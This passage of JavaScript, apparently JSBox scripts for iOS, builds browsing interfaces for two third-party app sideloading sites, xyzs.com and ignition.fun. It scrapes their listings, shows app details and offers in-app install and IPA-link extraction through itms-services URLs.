                            })
                        }
                    }
                }
            ]
        })
        ChangeColor($("B1"), 0)
        if ($cache.get("HotApp")) {
            $("StarList").data = $cache.get("HotApp")
        } else {
            RM(1)
        }
    }

    function RM(page) {
        $http.get({
            url: "http://mobile.xyzs.com/homepage?clientversion=6.2.2&lang=zh-Hans-CN&clienttype=1&device_uuid=Unknow&flagdata1=0&channel=500294&isidfatracking=1&identity=763&certId=763&isauthor=2&flagdata=0&spflag=0&ipatype=1&timestamp=1512736481&sign=d11ec1e6f226c80ac20a5a98d49c8aa3&size=20&page=" + page,
            handler(resp) {
                var banner = resp.data.data.banner
                var modular = resp.data.data.modular[0].data
                var arr = new Array()
                for (i in banner) {
                    var story = banner[i]
                    arr.push({
                        img: {
                            src: story.appicon
                        },
                        title: {
                            text: story.title
                        },
                        AppInfo: {
                            text: story.downloadnum + "下载 • " + story.size
                        },
                        dis: {
                            text: story.cusDesc
                        },
                        id: story.itunesid
                    })
                }
                for (i in modular) {
                    var story = modular[i]
                    arr.push({
                        img: {
                            src: story.icon
                        },
                        title: {
                            text: story.title
                        },
                        AppInfo: {
                            text: story.downloadnum + "下载 • " + story.size
                        },
                        dis: {
                            text: story.cusDesc
                        },
                        id: story.itunesid
                    })
                }
                $("StarList").data = arr
                $cache.set("HotApp", arr)
            }
        })
    }

    function BB() {
        $http.get({
            url: "http://mobile.xyzs.com/essential?clientversion=6.2.2&lang=zh-Hans-CN&clienttype=1&device_uuid=Unknow&flagdata1=0&devicetype=2&channel=500294&isidfatracking=1&identity=763&certId=763&isauthor=2&flagdata=0&spflag=0&ipatype=1&timestamp=1512736485&sign=b25da38aaa47ac9665d8cacf1decdd19",
            handler(resp) {
                var data = resp.data.data.apps
                var arr = new Array()
                for (i in data) {
                    var story = data[i]
                    arr.push({
                        img: {
                            src: story.icon
                        },
                        title: {
                            text: story.title
                        },
                        AppInfo: {
                            text: story.downloadnum + "下载 • " + story.size
                        },
                        dis: {
                            text: story.cusDesc
                        },
                        id: story.itunesid
                    })
                }
                $("StarList").data = arr
            }
        })
    }

    function XY(page) {
        $http.get({
            url: "http://mobile.xyzs.com/webgame/sf?clientversion=6.2.2&lang=zh-Hans-CN&clienttype=1&device_uuid=Unknow&flagdata1=0&channel=500294&isidfatracking=1&identity=763&certId=763&isauthor=2&flagdata=0&spflag=0&ipatype=1&timestamp=1512736488&sign=5e60c7c669312b4603605f9fd489dbd5&size=20&page=" + page,
            handler(resp) {
                var data = resp.data.data.applist
                for (i in data) {
                    var story = data[i]
                    if (page == 1 && i == 0) {
                        $("StarList").data = [{
                            img: {
                                src: story.icon
                            },
                            title: {
                                text: story.title
                            },
                            AppInfo: {
                                text: story.downloadnum + "下载 • " + story.size
                            },
                            dis: {
                                text: story.cusDesc
                            },
                            id: story.itunesid
                        }]
                    } else {
                        $("StarList").insert({
                            indexPath: $indexPath(0, $("StarList").data.length),
                            value: {
                                img: {
                                    src: story.icon
                                },
                                title: {
                                    text: story.title
                                },
                                AppInfo: {
                                    text: story.downloadnum + "下载 • " + story.size
                                },
                                dis: {
                                    text: story.cusDesc
                                },
                                id: story.itunesid
                            }
                        })
                    }
                }
            }
        })
    }

    function ThirdView() {
        $ui.push({
            props: {
                title: "搜索"
            },
            views: [VIEW,
                {
                    type: "list",
                    props: {
                        id: "List",
                        data: [{
                            rows: [{
                                    type: "input",
                                    props: {
                                        id: "wd",
                                        type: $kbType.search,
                                        placeholder: "搜索应用...",
                                        darkKeyboard: true
                                    },
                                    layout: function (make, view) {
                                        make.left.right.top.bottom.inset(5)
                                    },
                                    events: {
                                        returned: function (sender) {
                                            $cache.set("page", 1)
                                            Search(1)
                                            sender.blur()
                                        }
                                    }
                                },
                                {
                                    type: "label",
                                    props: {
                                        text: "Made by Hhdº"
                                    },
                                    layout: function (make, view) {
                                        make.left.inset(10)
                                        make.centerY.equalTo(view.super)
                                    }
                                }
                            ]
                        }]
                    },
                    layout: function (make) {
                        make.height.equalTo(50)
                        make.left.right.top.inset(0)
                    }
                },
                {
                    type: "list",
                    props: {
                        id: "SearchResult",
                        rowHeight: 85,
                        footer: {
                            type: "label",
                            props: {
                                height: 30,
                                textColor: $color("#AAAAAA"),
                                align: $align.center,
                                font: $font(12)
                            }
                        },
                        template: [{
                                type: "image",
                                props: {
                                    id: "img",
                                    radius: 15
                                },
                                layout: function (make, view) {
                                    make.left.top.bottom.inset(5)
                                    make.width.equalTo(view.height)
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "title",
                                    font: $font("bold", 17)
                                },
                                layout: function (make) {
                                    make.left.equalTo($("img").right).offset(10)
                                    make.top.right.inset(12)
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "AppInfo",
                                    font: $font("bold", 12),
                                    textColor: $color("gray")
                                },
                                layout: function (make) {
                                    make.left.equalTo($("title"))
                                    make.top.inset(37)
                                    make.right.inset(10)
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "dis",
                                    font: $font("bold", 13)
                                },
                                layout: function (make) {
                                    make.left.equalTo($("title"))
                                    make.top.inset(58)
                                    make.right.inset(10)
                                }
                            },
                        ]
                    },
                    layout: function (make) {
                        make.right.left.inset(0)
                        make.bottom.equalTo($("Rview").top)
                        make.top.equalTo($("List").bottom)
                    },
                    events: {
                        didReachBottom: function (sender) {
                            sender.footer.text = "加载中..."
                            sender.endFetchingMore()
                            var page = $cache.get("page") + 1
                            $cache.set("page", page)
                            Search(page)
                        },
                        didSelect: function (sender, indexPath, data) {
                            $http.get({
                                url: "http://mobile.xyzs.com/app/index?itunesid=" + data.id,
                                handler(resp) {
                                    details(resp.data.data.app)
                                }
                            })
                        }
                    }
                }
            ]
        })
        ChangeColor($("B3"), 2)
    }

    function Search(page) {
        $ui.loading(true)
        $http.get({
            url: "http://mobile.xyzs.com/search/result?keyword=" + encodeURI($("wd").text) + "&page=" + page,
            handler(resp) {
                var data = resp.data.data.result
                $ui.loading(false)
                for (i in data) {
                    var story = data[i]
                    if (i == 0 && page == 1) {
                        $("SearchResult").data = [{
                            img: {
                                src: story.icon
                            },
                            title: {
                                text: story.title
                            },
                            AppInfo: {
                                text: story.downloadnum + "下载 • " + story.size
                            },
                            dis: {
                                text: story.cusDesc
                            },
                            id: story.itunesid
                        }]
                    } else {
                        $("SearchResult").insert({
                            indexPath: $indexPath(0, $("SearchResult").data.length),
                            value: {
                                img: {
                                    src: story.icon
                                },
                                title: {
                                    text: story.title
                                },
                                AppInfo: {
                                    text: story.downloadnum + "下载 • " + story.size
                                },
                                dis: {
                                    text: story.cusDesc
                                },
                                id: story.itunesid
                            }
                        })
                    }
                }
            }
        })
    }

    function SecondView() {
        $ui.push({
            props: {
                title: "分类"
            },
            views: [VIEW,
                {
                    type: "list",
                    props: {
                        id: "TermList",
                        rowHeight: 177,
                        template: [{
                            type: "matrix",
                            props: {
                                id: "Term",
                                columns: 4,
                                itemHeight: 80,
                                spacing: 5,
                                template: [{
                                    type: "label",
                                    props: {
                                        id: "label",
                                        align: $align.center,
                                        font: $font(17)
                                    },
                                    layout: $layout.fill
                                }]
                            },
                            layout: $layout.fill,
                            events: {
                                didSelect: function (sender, indexPath, data) {
                                    $cache.set("page", 1)
                                    TypeView(data.fatherid, data.id, data.label.text)
                                }
                            }
                        }]
                    },
                    layout: function (make) {
                        make.right.left.top.inset(0)
                        make.bottom.equalTo($("Rview").top)
                    }
                }
            ]
        })
        ChangeColor($("B2"), 1)
        if ($cache.get("Types")) {
            $("TermList").data = $cache.get("Types")
        } else {
            $http.get({
                url: "http://mobile.xyzs.com/software/categories",
                handler(resp) {
                    var data = resp.data.data
                    var arr = new Array()
                    for (i in data) {
                        var story = data[i].child
                        var farr = story.map(function (item) {
                            return {
                                label: {
                                    text: item.name
                                },
                                id: item.classid,
                                fatherid: data[i].classid
                            }
                        })
                        arr.push({
                            title: data[i].name,
                            rows: [{
                                Term: {
                                    data: farr
                                }
                            }]
                        })
                    }
                    $("TermList").data = arr
                    $cache.set("Types", arr)
                }
            })
        }
    }

    function TypeView(fatherid, id, name) {
        $ui.push({
            props: {
                title: name
            },
            views: [{
                type: "list",
                props: {
                    id: "TypeList",
                    rowHeight: 85,
                    footer: {
                        type: "label",
                        props: {
                            height: 30,
                            text: "加载中……",
                            textColor: $color("#AAAAAA"),
                            align: $align.center,
                            font: $font(12)
                        }
                    },
                    template: [{
                            type: "image",
                            props: {
                                id: "img",
                                radius: 15
                            },
                            layout: function (make, view) {
                                make.left.top.bottom.inset(5)
                                make.width.equalTo(view.height)
                            }
                        },
                        {
                            type: "label",
                            props: {
                                id: "title",
                                font: $font("bold", 17)
                            },
                            layout: function (make) {
                                make.left.equalTo($("img").right).offset(10)
                                make.top.right.inset(12)
                            }
                        },
                        {
                            type: "label",
                            props: {
                                id: "AppInfo",
                                font: $font("bold", 12),
                                textColor: $color("gray")
                            },
                            layout: function (make) {
                                make.left.equalTo($("title"))
                                make.top.inset(37)
                                make.right.inset(10)
                            }
                        },
                        {
                            type: "label",
                            props: {
                                id: "dis",
                                font: $font("bold", 13)
                            },
                            layout: function (make) {
                                make.left.equalTo($("title"))
                                make.top.inset(58)
                                make.right.inset(10)
                            }
                        },
                    ]
                },
                layout: $layout.fill,
                events: {
                    didReachBottom: function (sender) {
                        sender.endFetchingMore()
                        var page = $cache.get("page") + 1
                        $cache.set("page", page)
                        TypeLoad(page, fatherid, id)
                    },
                    didSelect: function (sender, indexPath, data) {
                        $http.get({
                            url: "http://mobile.xyzs.com/app/index?itunesid=" + data.id,
                            handler(resp) {
                                details(resp.data.data.app)
                            }
                        })
                    }
                }
            }]
        })
        TypeLoad(1, fatherid, id)
    }

    function details(AppInfo) {
        $ui.push({
            props: {
                title: "应用详情"
            },
            views: [{
                type: "scroll",
                props: {
                    contentSize: $size(0, 700)
                },
                layout: $layout.fill,
                views: [{
                        type: "button",
                        props: {
                            id: "Icon",
                            src: AppInfo.icon,
                            radius: 15
                        },
                        layout: function (make, view) {
                            make.left.inset(20)
                            make.top.inset(20)
                            make.size.equalTo(100, 100)
                        },
                        events: {
                            tapped(sender) {
                                $ui.push({
                                    views: [{
                                        type: "web",
                                        props: {
                                            url: AppInfo.icon
                                        },
                                        layout: $layout.fill
                                    }]
                                })
                            }
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "name",
                            text: AppInfo.title_arr[0],
                            font: $font("bold", 18)
                        },
                        layout: function (make, view) {
                            make.top.inset(30)
                            make.left.equalTo($("Icon").right).offset(15)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "Ifm",
                            font: $font("bold", 12),
                            text: AppInfo.downloadnum + "下载 • " + AppInfo.size,
                            textColor: $color("gray")
                        },
                        layout: function (make) {
                            make.left.equalTo($("name"))
                            make.top.equalTo($("name").bottom).offset(14)
                            make.right.inset(10)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "Dis",
                            text: AppInfo.desc,
                            font: $font("bold", 13)
                        },
                        layout: function (make) {
                            make.left.equalTo($("name"))
                            make.top.equalTo($("Ifm").bottom).offset(14)
                            make.width.equalTo(200)
                        }
                    },
                    {
                        type: "view",
                        props: {
                            id: "line1",
                            bgcolor: $color("#b2b2b2")
                        },
                        layout: function (make) {
                            make.left.equalTo(0)
                            make.top.equalTo($("Icon").bottom).offset(10)
                            make.height.equalTo(0.5)
                            make.width.equalTo($device.info.screen.width)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "line2",
                            text: "●",
                            textColor: mainColor
                        },
                        layout: function (make) {
                            make.top.equalTo($("line1").bottom).offset(10)
                            make.left.inset(10)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "line3",
                            text: "应用简介",
                            font: $font(16)
                        },
                        layout: function (make) {
                            make.top.equalTo($("line1").bottom).offset(12)
                            make.left.equalTo($("line2").right).offset(7)
                        }
                    },
                    {
                        type: "text",
                        props: {
                            id: "Discrip",
                            html: AppInfo.content,
                            editable: false,
                            font: $font("Avenir-Light", 15)
                        },
                        layout: function (make) {
                            make.left.inset(18)
                            make.top.equalTo($("line2").bottom).offset(0)
                            make.height.equalTo(90)
                            make.width.equalTo($device.info.screen.width - 13)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "line4",
                            text: "●",
                            textColor: mainColor
                        },
                        layout: function (make) {
                            make.top.equalTo($("Discrip").bottom).offset(10)
                            make.left.inset(10)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "line5",
                            text: "更新说明",
                            font: $font(16)
                        },
                        layout: function (make) {
                            make.top.equalTo($("Discrip").bottom).offset(12)
                            make.left.equalTo($("line4").right).offset(7)
                        }
                    },
                    {
                        type: "text",
                        props: {
                            id: "UpdateLog",
                            html: AppInfo.newfeatures,
                            editable: false,
                            font: $font("Avenir-Light", 15)
                        },
                        layout: function (make) {
                            make.left.inset(18)
                            make.top.equalTo($("line4").bottom).offset(0)
                            make.height.equalTo(90)
                            make.width.equalTo($device.info.screen.width - 13)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "line6",
                            text: "●",
                            textColor: mainColor
                        },
                        layout: function (make) {
                            make.top.equalTo($("UpdateLog").bottom).offset(10)
                            make.left.inset(10)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "line7",
                            text: "其他信息",
                            font: $font(16)
                        },
                        layout: function (make) {
                            make.top.equalTo($("UpdateLog").bottom).offset(12)
                            make.left.equalTo($("line6").right).offset(7)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "version",
                            text: "版本：",
                            textColor: $color("#bdc3c7"),
                            font: $font("ArialHebrew-Light", 15)
                        },
                        layout: function (make) {
                            make.top.equalTo($("line7").bottom).offset(10)
                            make.left.inset(30)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "appupdate",
                            text: "更新日期：",
                            textColor: $color("#bdc3c7"),
                            font: $font("ArialHebrew-Light", 15)
                        },
                        layout: function (make) {
                            make.top.equalTo($("version").bottom).offset(2)
                            make.left.inset(30)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            id: "system",
                            text: "兼容性：",
                            textColor: $color("#bdc3c7"),
                            font: $font("ArialHebrew-Light", 15)
                        },
                        layout: function (make) {
                            make.top.equalTo($("appupdate").bottom).offset(5)
                            make.left.inset(30)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            text: AppInfo.version,
                            font: $font("ArialHebrew-Light", 17)
                        },
                        layout: function (make) {
                            make.top.equalTo($("line7").bottom).offset(7)
                            make.left.equalTo($("version").right)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            text: AppInfo.appupdate,
                            font: $font("ArialHebrew-Light", 17)
                        },
                        layout: function (make) {
                            make.top.equalTo($("version").bottom).offset(0)
                            make.left.equalTo($("appupdate").right)
                        }
                    },
                    {
                        type: "label",
                        props: {
                            text: AppInfo.system.replace("兼容性：", ""),
                            font: $font("Avenir-Light", 14)
                        },
                        layout: function (make) {
                            make.top.equalTo($("appupdate").bottom).offset(2)
                            make.left.equalTo($("system").right)
                        }
                    },
                    {
                        type: "button",
                        props: {
                            id: "Share",
                            title: "   分享",
                            icon: $icon("022", $color("white"), $size(23, 23)),
                            bgcolor: mainColor
                        },
                        layout: function (make, view) {
                            make.left.inset(10)
                            make.width.equalTo($device.info.screen.width / 2 - 5)
                            make.height.equalTo(35)
                            make.top.equalTo($("system").bottom).offset(10)
                        },
                        events: {
                            tapped(sender) {
                                $share.sheet("http://software.xyzs.com/app_share/index.html?itunesid=" + AppInfo.itunesid)
                            }
                        }
                    },
                    {
                        type: "button",
                        props: {
                            title: "   安装",
                            icon: $icon("165", $color("white"), $size(23, 23)),
                            bgcolor: mainColor
                        },
                        layout: function (make, view) {
                            make.width.equalTo($device.info.screen.width / 2 - 20)
                            make.height.equalTo(35)
                            make.top.equalTo($("system").bottom).offset(10)
                            make.left.equalTo($("Share").right).offset(10)
                        },
                        events: {
                            tapped(sender) {
                                $http.get({
                                    url: "http://software.xyzs.com/app_share/index.html?itunesid=" + AppInfo.itunesid,
                                    header: {
                                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14B100 UCBrowser/10.7.5.650 Mobile"
                                    },
                                    handler: function (resp) {
                                        var downURL = resp.data.match(/itms-services.*?plist/)[0]
                                        $app.openBrowser({
                                            url: downURL
                                        })
                                    }
                                })
                            },
                            longPressed: function (sender) {
                                $ui.menu({
                                    items: ["复制IPA包链接"],
                                    handler: function () {
                                        $http.get({
                                            url: "http://software.xyzs.com/app_share/index.html?itunesid=" + AppInfo.itunesid,
                                            handler: function (resp) {
                                                var downURL = $text.base64Decode(resp.data.match(/resurl=\".*?(?=\")/)[0].replace("resurl=\"", ""))
                                                $clipboard.text = downURL
                                                $ui.toast("已复制")
                                            }
                                        })
                                    }
                                })
                            }
                        }
                    }
                ]
            }]
        })
    }

    function TypeLoad(page, fatherid, id) {
        $http.get({
            url: "http://mobile.xyzs.com/software/category?category_classid=" + id + "&category_father_classid=" + fatherid + "&page=" + page,
            handler(resp) {
                var data = resp.data.data.applist
                for (i in data) {
                    var story = data[i]
                    $("TypeList").insert({
                        indexPath: $indexPath(0, $("TypeList").data.length),
                        value: {
                            img: {
                                src: story.icon
                            },
                            title: {
                                text: story.title
                            },
                            AppInfo: {
                                text: story.downloadnum + "下载 • " + story.size
                            },
                            dis: {
                                text: story.cusDesc
                            },
                            id: story.itunesid
                        }
                    })
                }
            }
        })
    }

    function ChangeColor(sd, num) {
        $("B1").icon = $icon(iconType[0], $color("#a4b4c4"), $size(30, 30))
        $("B2").icon = $icon(iconType[1], $color("#a4b4c4"), $size(30, 30))
        $("B3").icon = $icon(iconType[2], $color("#a4b4c4"), $size(30, 30))
        sd.icon = $icon(iconType[num], mainColor, $size(30, 30))
    }

    $cache.remove("HotApp")

    $app.open()

    MainView()

}



function ipa() {
    /*
    ignition 是第三方企业证书APP免费提供站
    
    js可提取ipa文件包，在线安装，过滤广告，在线搜索等功能。
    
    by：iPhone 8、小良
    更多js脚本： https://ae85.cn/
    */

    var souview = {
        type: "view",
        props: {
            id: "souView",
            bgcolor: $color("#1D1D27"),
        },
        layout: (make, view) => {
            make.right.left.top.inset(0);
            make.height.equalTo(60)
        },
        views: [{
            type: "input",
            props: {
                id: "bjk",
                placeholder: " 输入关键字进行搜索...",
                bgcolor: $color("#848485"),
                textColor: $color("#fff"),
            },
            layout: function (make) {
                make.top.inset(10)
                make.left.right.inset(10);
                make.height.equalTo(35);
            },
            events: {
                returned: function (sender) {
                    getsouapp(sender.text)
                }
            }
        }, ]
    }

    function csh() {
        $ui.push({
            props: {
                title: "ignition"
            },
            views: [souview,
                {
                    type: "view",
                    props: {
                        id: "zhoView",
                    },
                    layout: (make, view) => {
                        make.right.left.bottom.inset(0);
                        make.top.equalTo($("souView").bottom);

                    },
                    views: [{
                        type: "list",
                        props: {
                            id: "cd",
                            rowHeight: 50,
                            bgcolor: $color("#15151E"),
                            separatorColor: $color('#15151E'),
                            data: [{
                                img: {
                                    src: "https://app.ignition.fun/img/All%20Apps.png"
                                },
                                mc: {
                                    text: "All Apps"
                                },
                                key: "All%20Apps"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/AppStore.png"
                                },
                                mc: {
                                    text: "AppStore"
                                },
                                key: "appstore"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Emulators.png"
                                },
                                mc: {
                                    text: "Emulators"
                                },
                                key: "emulators"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Entertainment.png"
                                },
                                mc: {
                                    text: "Entertainment"
                                },
                                key: "entertainment"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Experimental.png"
                                },
                                mc: {
                                    text: "Experimental"
                                },
                                key: "experimental"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Games.png"
                                },
                                mc: {
                                    text: "Games"
                                },
                                key: "games"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Jailbreaks.png"
                                },
                                mc: {
                                    text: "Jailbreaks"
                                },
                                key: "jailbreaks"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Social.png"
                                },
                                mc: {
                                    text: "Social"
                                },
                                key: "social"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Tweaked.png"
                                },
                                mc: {
                                    text: "Tweaked"
                                },
                                key: "tweaked"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Unknown.png"
                                },
                                mc: {
                                    text: "Unknown"
                                },
                                key: "unknown"
                            }, {
                                img: {
                                    src: "https://app.ignition.fun/img/Utilities.png"
                                },
                                mc: {
                                    text: "Utilities"
                                },
                                key: "utilities"
                            }, {
                                img: {
                                    src: "https://ae85.cn/wf/xl.png"
                                },
                                mc: {
                                    text: "iPhone 8、小良"
                                },
                                key: "https://ae85.cn/yy.html"
                            }],
                            template: {
                                props: {
                                    bgcolor: $color("#1D1D27"),
                                },
                                views: [{
                                        type: "image",
                                        props: {
                                            id: "img",
                                            radius: 7
                                        },
                                        layout: function (make, view) {
                                            make.left.inset(10);
                                            make.centerY.equalTo(view.center);
                                            make.height.width.equalTo(40);
                                        }
                                    },
                                    {
                                        type: "label",
                                        props: {
                                            id: "mc",
                                            align: $align.center,
                                            lines: 0,
                                            font: $font("bold", 20),
                                            textColor: $color('#FFF')
                                        },
                                        layout: function (make, view) {
                                            make.left.equalTo($("img").right).offset(15);
                                            make.centerY.equalTo(view.center);
                                        }
                                    },
                                    {
                                        type: "label",
                                        props: {
                                            text: ">",
                                            align: $align.center,
                                            lines: 1,
                                            textColor: $color("#434345"),
                                            font: $font(30)
                                        },
                                        layout: function (make, view) {
                                            make.centerY.equalTo(view.center);
                                            make.right.inset(10);
                                        }
                                    }
                                ]
                            }
                        },
                        layout: function (make) {
                            make.top.equalTo(0)
                            make.left.right.bottom.inset(0);
                        },
                        events: {
                            didSelect: function (sender, indexPath, data) {
                                if (data.key.indexOf('ae85.cn') != -1) {
                                    $ui.push({
                                        props: {
                                            title: "应用"
                                        },
                                        views: [{
                                            type: "web",
                                            props: {
                                                id: "web",
                                                url: data.key
                                            },
                                            layout: $layout.fill,
                                        }]
                                    });
                                } else {
                                    gteappdata(data.key, data.mc.text)
                                }

                            }
                        }
                    }]
                },
            ]
        });
    }

    csh()

    function applist(name, data) {
        $ui.push({
            props: {
                title: name
            },
            views: [souview, {
                type: "view",
                props: {
                    id: "applistView",
                },
                layout: (make, view) => {
                    make.right.left.bottom.inset(0);
                    make.top.equalTo($("souView").bottom);
                },
                views: [{
                    type: "list",
                    props: {
                        id: "cd",
                        rowHeight: 50,
                        bgcolor: $color("#15151E"),
                        separatorColor: $color('#15151E'),
                        data: data,
                        template: {
                            props: {
                                bgcolor: $color("#1D1D27"),
                            },
                            views: [{
                                    type: "image",
                                    props: {
                                        id: "img",
                                        radius: 7
                                    },
                                    layout: function (make, view) {
                                        make.left.inset(10);
                                        make.centerY.equalTo(view.center);
                                        make.height.width.equalTo(40);
                                    }
                                },
                                {
                                    type: "label",
                                    props: {
                                        id: "mc",
                                        align: $align.center,
                                        lines: 0,
                                        font: $font("bold", 20),
                                        textColor: $color('#FFF')
                                    },
                                    layout: function (make, view) {
                                        make.left.equalTo($("img").right).offset(15);
                                        make.centerY.equalTo(view.center);
                                    }
                                },
                                {
                                    type: "label",
                                    props: {
                                        id: "rq",
                                        text: ">",
                                        align: $align.center,
                                        lines: 1,
                                        textColor: $color("#434345"),
                                        font: $font(30)
                                    },
                                    layout: function (make, view) {
                                        make.centerY.equalTo(view.center);
                                        make.right.inset(10);
                                    }
                                },
                                {
                                    type: "matrix",
                                    props: {
                                        id: "hhq",
                                        itemHeight: 30,
                                        columns: 1,
                                        spacing: 0,
                                        radius: 15,
                                        template: {
                                            props: {
                                                bgcolor: $color("#00cc00"),
                                            },
                                            views: [{
                                                type: "label",
                                                props: {
                                                    id: "hq",
                                                    text: "安装",
                                                    textColor: $color("#fff"),
                                                    align: $align.center,
                                                    font: $font(15)
                                                },
                                                layout: $layout.fill
                                            }]
                                        }
                                    },
                                    layout: function (make, view) {
                                        make.centerY.equalTo(view.center);
                                        make.size.equalTo($size(50, 30));
                                        make.right.equalTo($('rq').left).inset(10);
                                    },
                                    events: {
                                        didSelect: function (sender, indexPath, data) {
                                            install(data.id)
                                        }
                                    }
                                }
                            ]

                        }
                    },
                    layout: function (make) {
                        make.top.equalTo(0)
                        make.left.right.bottom.inset(0);
                    },
                    events: {
                        didSelect: function (sender, indexPath, data) {
                            getappxq(data.id, data.mc.text, data.img.src)
                        }
                    }
                }]
            }]
        });
    }

    function gteappdata(key, title) {
        $ui.loading(true)
        $http.get({
            url: "https://app.ignition.fun/pages/category.php?category=" + key,
            handler: function (resp) {
                $ui.loading(false)
                var html = resp.data.replace(/\n|\s|\r/g, "")
                var arr = html.match(/<li>(\S*?)<\/li>/g)
                var data = []
                for (i in arr) {
                    var sen = arr[i]
                    var name = sen.match(/\"item-header\">(\S*?)<divclass/)[0]
                    name = name.match(/<\/div>(\S*?)<divclass/)[1]
                    var img = sen.match(/<imgsrc=\"(\S*?)\"/)[1]
                    var href = sen.match(/<ahref=\"(\S*?)\"/)[1]
                    var id = href.replace(/\/|app/g, "")
                    data.push({
                        img: {
                            src: img
                        },
                        mc: {
                            text: name
                        },
                        id: id,
                        hhq: {
                            data: [{
                                id: id
                            }]
                        }
                    })
                }
                applist(title, data)
            }
        });
    }

    function install(id) {
        $app.openURL("itms-services://?action=download-manifest&url=https://ignition.fun/install.php%3Fapp%3D" + id);
    }

    function getappxq(id, name, img) {
        $ui.loading(true)
        $http.get({
            url: "https://app.ignition.fun/pages/app.php?app=" + id,
            handler: function (resp) {
                $ui.loading(false)
                var html = resp.data.replace(/\n|\r/g, "")
                var xiangq = html.match(/block-strong\">.*?<\/div>/)[0]
                xiangq = xiangq.replace(/block-strong\">|<ul>|<p>|<li>|<h3>|<\/div>|<\/ul>/g, "")
                xiangq = xiangq.replace(/<\/p>|<\/li>|<\/h3>/g, "\n")
                var text = html.match(/item-after\">(\S*?)<\/div>/g)
                var version = text[0].match(/item-after\">(\S*?)<\/div>/)[1]
                xqjm(name, id, img, version, xiangq)
            }
        });
    }

    function xqjm(name, id, img, bb, xq) {
        $ui.push({
            props: {
                title: name
            },
            views: [{
                type: "view",
                props: {
                    id: "appxqView",
                    bgcolor: $color("#15151E"),
                },
                layout: (make, view) => {
                    make.right.left.bottom.top.inset(0);
                },
                views: [{
                    type: "view",
                    props: {
                        id: "tou",
                        bgcolor: $color("#1D1D27"),
                    },
                    layout: (make, view) => {
                        make.right.left.inset(0);
                        make.top.inset(30)
                        make.height.equalTo(90)
                    },
                    views: [{
                            type: "image",
                            props: {
                                id: "img",
                                src: img,
                                radius: 7
                            },
                            layout: function (make, view) {
                                make.left.inset(10);
                                make.centerY.equalTo(view.center);
                                make.height.width.equalTo(70);
                            }
                        },
                        {
                            type: "label",
                            props: {
                                id: "mc",
                                text: name,
                                align: $align.center,
                                lines: 0,
                                font: $font("bold", 18),
                                textColor: $color('#FFF')
                            },
                            layout: function (make, view) {
                                make.left.equalTo($("img").right).offset(15);
                                make.top.equalTo(15)
                            }
                        },
                        {
                            type: "label",
                            props: {
                                id: "Version",
                                text: "Version :  " + bb,
                                align: $align.center,
                                lines: 0,
                                font: $font(15),
                                textColor: $color('#78787E'),
                            },
                            layout: function (make, view) {
                                make.left.equalTo($("mc").left)
                                make.top.equalTo($("mc").bottom).offset(15);
                            }
                        }, {
                            type: "button",
                            props: {
                                id: "hq",
                                title: "GET",
                                textColor: $color("#fff"),
                                radius: 15,
                                bgcolor: $color("#3E92CC"),
                                font: $font("bold", 15)
                            },
                            layout: function (make, view) {
                                make.right.inset(10);
                                make.centerY.equalTo(view.center);
                                make.size.equalTo($size(50, 30));
                            },
                            events: {
                                tapped: function (sender, indexPath, data) {
                                    var installurl = "itms-services://?action=download-manifest&url=https://ignition.fun/install.php%3Fapp%3D" + id
                                    $ui.menu({
                                        items: ["在线安装", "提取ipa", "复制安装地址", "复制ipa地址"],
                                        handler: (title, idx) => {
                                            switch (idx) {
                                                case 0:
                                                    install(id)
                                                    break;
                                                case 1:
                                                    getipa(id, 2, name)
                                                    break;
                                                case 2:
                                                    $clipboard.text = installurl
                                                    $ui.alert("已复制\n\n" + installurl);
                                                    break;
                                                case 3:
                                                    getipa(id, 1)
                                                    break;
                                            }
                                        }
                                    });
                                }
                            }
                        },
                    ]
                }, {
                    type: "label",
                    props: {
                        id: "About",
                        text: "About " + name,
                        align: $align.center,
                        lines: 0,
                        font: $font("bold", 17),
                        textColor: $color('#78787E'),
                    },
                    layout: function (make, view) {
                        make.left.offset(15)
                        make.top.equalTo($("tou").bottom).offset(55);
                    }
                }, {
                    type: "view",
                    props: {
                        id: "xiangqing",
                        bgcolor: $color("#1D1D27"),
                    },
                    layout: (make, view) => {
                        make.top.equalTo($("About").bottom).inset(10);
                        make.left.right.bottom.offset(0)
                    },
                    views: [{
                        type: "text",
                        props: {
                            id: "Version",
                            text: xq,
                            lines: 0,
                            font: $font(16),
                            textColor: $color('#fff'),
                            bgcolor: $color("#1D1D27"),
                        },
                        layout: function (make, view) {
                            make.top.left.right.bottom.inset(5)
                        }
                    }, ]
                }]
            }]
        });
    }

    $http.get({
        url: "https://app.ignition.fun/pages/search.php",
        handler: function (resp) {
            $ui.loading(false)
            var html = resp.data.replace(/\n|\s|\r/g, "")
            var arr = html.match(/<li>(\S*?)<\/li>/g)
            $cache.set("arr", arr);
        }
    })

    function getsouapp(key) {
        var arr = $cache.get("arr");
        var data = []
        for (i in arr) {
            var sen = arr[i]
            var name = sen.match(/\"item-header\">(\S*?)<divclass/)[0]
